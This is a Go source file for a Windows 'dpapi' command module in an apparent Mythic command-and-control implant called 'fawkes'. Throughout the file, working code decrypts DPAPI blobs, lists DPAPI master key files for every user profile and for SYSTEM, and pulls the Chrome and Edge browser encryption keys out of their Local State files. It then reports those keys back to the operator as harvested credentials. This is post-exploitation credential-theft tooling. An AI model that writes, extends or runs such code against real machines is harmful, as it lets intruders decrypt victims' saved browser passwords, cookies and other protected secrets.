//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// DpapiCommand provides DPAPI blob decryption and key extraction.
type DpapiCommand struct{}

func (c *DpapiCommand) Name() string        { return "dpapi" }
func (c *DpapiCommand) Description() string { return "DPAPI blob decryption and key extraction" }

type dpapiArgs struct {
	Action  string `json:"action"`  // decrypt, masterkeys, wifi, chrome-key
	Blob    string `json:"blob"`    // base64-encoded DPAPI blob (for decrypt)
	Entropy string `json:"entropy"` // optional entropy for decrypt (base64)
	Path    string `json:"path"`    // optional path for masterkeys
}

func (c *DpapiCommand) Execute(task structs.Task) structs.CommandResult {
	var args dpapiArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Action == "" {
		args.Action = "decrypt"
	}

	switch args.Action {
	case "decrypt":
		return c.decrypt(args)
	case "masterkeys":
		return c.listMasterKeys(args)
	case "chrome-key":
		return c.extractChromeKey()
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: decrypt, masterkeys, chrome-key", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// decrypt decrypts a base64-encoded DPAPI blob using CryptUnprotectData
func (c *DpapiCommand) decrypt(args dpapiArgs) structs.CommandResult {
	if args.Blob == "" {
		return structs.CommandResult{
			Output:    "Error: -blob parameter required (base64-encoded DPAPI blob)",
			Status:    "error",
			Completed: true,
		}
	}

	data, err := base64.StdEncoding.DecodeString(args.Blob)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding base64 blob: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	dataIn := windows.DataBlob{
		Size: uint32(len(data)),
		Data: &data[0],
	}
	var dataOut windows.DataBlob
	var pEntropy *windows.DataBlob

	if args.Entropy != "" {
		entropyBytes, err := base64.StdEncoding.DecodeString(args.Entropy)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error decoding entropy: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		pEntropy = &windows.DataBlob{
			Size: uint32(len(entropyBytes)),
			Data: &entropyBytes[0],
		}
	}

	err = windows.CryptUnprotectData(&dataIn, nil, pEntropy, 0, nil, 0, &dataOut)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("CryptUnprotectData failed: %v\nNote: Decryption requires the same user context that encrypted the data.", err),
			Status:    "error",
			Completed: true,
		}
	}

	result := make([]byte, dataOut.Size)
	copy(result, unsafe.Slice(dataOut.Data, dataOut.Size))
	windows.LocalFree(windows.Handle(unsafe.Pointer(dataOut.Data)))

	var sb strings.Builder
	sb.WriteString("=== DPAPI DECRYPTION RESULT ===\n\n")
	sb.WriteString(fmt.Sprintf("Input size:  %d bytes\n", len(data)))
	sb.WriteString(fmt.Sprintf("Output size: %d bytes\n\n", len(result)))

	// Try to display as string if it looks like text
	if dpapiIsPrintable(result) {
		sb.WriteString(fmt.Sprintf("Plaintext (text): %s\n", string(result)))
	} else {
		sb.WriteString(fmt.Sprintf("Plaintext (hex): %s\n", hex.EncodeToString(result)))
		sb.WriteString(fmt.Sprintf("Plaintext (b64): %s\n", base64.StdEncoding.EncodeToString(result)))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// listMasterKeys enumerates DPAPI master key files
func (c *DpapiCommand) listMasterKeys(args dpapiArgs) structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== DPAPI MASTER KEYS ===\n\n")

	searchPaths := []string{}

	if args.Path != "" {
		searchPaths = append(searchPaths, args.Path)
	} else {
		// Current user's master keys
		appData := os.Getenv("APPDATA")
		if appData != "" {
			searchPaths = append(searchPaths,
				filepath.Join(appData, "Microsoft", "Protect"),
			)
		}

		// System master keys (requires SYSTEM)
		systemRoot := os.Getenv("SystemRoot")
		if systemRoot == "" {
			systemRoot = `C:\Windows`
		}
		searchPaths = append(searchPaths,
			filepath.Join(systemRoot, "System32", "Microsoft", "Protect"),
		)

		// All user profiles
		usersDir := `C:\Users`
		entries, _ := os.ReadDir(usersDir)
		for _, e := range entries {
			if e.IsDir() && e.Name() != "Public" && e.Name() != "Default" && e.Name() != "Default User" && e.Name() != "All Users" {
				protectDir := filepath.Join(usersDir, e.Name(), "AppData", "Roaming", "Microsoft", "Protect")
				searchPaths = append(searchPaths, protectDir)
			}
		}
	}

	totalKeys := 0
	for _, basePath := range searchPaths {
		info, err := os.Stat(basePath)
		if err != nil || !info.IsDir() {
			continue
		}

		// Walk the Protect directory looking for SID subdirectories
		entries, err := os.ReadDir(basePath)
		if err != nil {
			sb.WriteString(fmt.Sprintf("[!] Cannot read %s: %v\n", basePath, err))
			continue
		}

		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}

			sidDir := filepath.Join(basePath, entry.Name())
			sb.WriteString(fmt.Sprintf("--- %s ---\n", sidDir))

			keyFiles, err := os.ReadDir(sidDir)
			if err != nil {
				sb.WriteString(fmt.Sprintf("  [!] Cannot read: %v\n", err))
				continue
			}

			for _, kf := range keyFiles {
				if kf.IsDir() {
					continue
				}

				info, err := kf.Info()
				if err != nil {
					continue
				}

				name := kf.Name()
				size := info.Size()
				modTime := info.ModTime().Format(time.RFC3339)

				// Check if it looks like a GUID (master key file)
				if isGUID(name) {
					sb.WriteString(fmt.Sprintf("  [KEY]      %s  (%d bytes, modified %s)\n", name, size, modTime))
					totalKeys++
				} else if name == "Preferred" {
					sb.WriteString(fmt.Sprintf("  [PREFERRED] %s  (%d bytes)\n", name, size))
				} else {
					sb.WriteString(fmt.Sprintf("  [OTHER]    %s  (%d bytes)\n", name, size))
				}
			}
		}
	}

	sb.WriteString(fmt.Sprintf("\n--- Total: %d master key files found ---\n", totalKeys))

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// extractChromeKey extracts the Chrome/Edge Local State encryption key via DPAPI
func (c *DpapiCommand) extractChromeKey() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== CHROME/EDGE ENCRYPTION KEYS ===\n\n")

	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return structs.CommandResult{
			Output:    "LOCALAPPDATA not set",
			Status:    "error",
			Completed: true,
		}
	}

	browsers := map[string]string{
		"Chrome": filepath.Join(localAppData, "Google", "Chrome", "User Data", "Local State"),
		"Edge":   filepath.Join(localAppData, "Microsoft", "Edge", "User Data", "Local State"),
	}

	creds := []structs.MythicCredential{}

	for name, path := range browsers {
		data, err := os.ReadFile(path)
		if err != nil {
			sb.WriteString(fmt.Sprintf("[%s] Local State not found: %v\n", name, err))
			continue
		}

		var localState struct {
			OSCrypt struct {
				EncryptedKey string `json:"encrypted_key"`
			} `json:"os_crypt"`
		}
		if err := json.Unmarshal(data, &localState); err != nil {
			sb.WriteString(fmt.Sprintf("[%s] Failed to parse Local State: %v\n", name, err))
			continue
		}

		if localState.OSCrypt.EncryptedKey == "" {
			sb.WriteString(fmt.Sprintf("[%s] No encrypted key found\n", name))
			continue
		}

		encKey, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
		if err != nil {
			sb.WriteString(fmt.Sprintf("[%s] Failed to decode key: %v\n", name, err))
			continue
		}

		// Strip DPAPI prefix (5 bytes)
		if len(encKey) < 5 || string(encKey[:5]) != "DPAPI" {
			sb.WriteString(fmt.Sprintf("[%s] Unexpected key prefix\n", name))
			continue
		}

		// Decrypt with DPAPI
		plainKey, err := dpapiDecryptBlob(encKey[5:])
		if err != nil {
			sb.WriteString(fmt.Sprintf("[%s] DPAPI decryption failed: %v\n", name, err))
			continue
		}

		keyHex := hex.EncodeToString(plainKey)
		keyB64 := base64.StdEncoding.EncodeToString(plainKey)

		sb.WriteString(fmt.Sprintf("[%s] Encryption Key:\n", name))
		sb.WriteString(fmt.Sprintf("  Hex: %s\n", keyHex))
		sb.WriteString(fmt.Sprintf("  B64: %s\n\n", keyB64))

		creds = append(creds, structs.MythicCredential{
			CredentialType: "key",
			Realm:          name,
			Account:        "Local State",
			Credential:     keyHex,
			Comment:        "dpapi chrome-key extraction",
		})
	}

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(creds) > 0 {
		result.Credentials = &creds
	}
	return result
}

// dpapiDecryptBlob decrypts a DPAPI-protected blob using CryptUnprotectData
func dpapiDecryptBlob(data []byte) ([]byte, error) {
	dataIn := windows.DataBlob{
		Size: uint32(len(data)),
		Data: &data[0],
	}
	var dataOut windows.DataBlob

	err := windows.CryptUnprotectData(&dataIn, nil, nil, 0, nil, 0, &dataOut)
	if err != nil {
		return nil, fmt.Errorf("CryptUnprotectData: %w", err)
	}

	result := make([]byte, dataOut.Size)
	copy(result, unsafe.Slice(dataOut.Data, dataOut.Size))
	windows.LocalFree(windows.Handle(unsafe.Pointer(dataOut.Data)))

	return result, nil
}

// dpapiIsPrintable checks if a byte slice contains printable ASCII/UTF-8
func dpapiIsPrintable(data []byte) bool {
	for _, b := range data {
		if b < 0x20 && b != '\n' && b != '\r' && b != '\t' {
			return false
		}
	}
	return true
}

// isGUID checks if a string looks like a GUID
func isGUID(s string) bool {
	if len(s) != 36 {
		return false
	}
	for i, c := range s {
		if i == 8 || i == 13 || i == 18 || i == 23 {
			if c != '-' {
				return false
			}
		} else {
			if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
				return false
			}
		}
	}
	return true
}

// extractXMLTag extracts the text content of an XML tag
func extractXMLTag(xml, tag string) string {
	start := strings.Index(xml, "<"+tag+">")
	if start == -1 {
		return ""
	}
	start += len(tag) + 2
	end := strings.Index(xml[start:], "</"+tag+">")
	if end == -1 {
		return ""
	}
	return xml[start : start+end]
}

// WLAN API structures are defined in wlanprofiles_windows.go
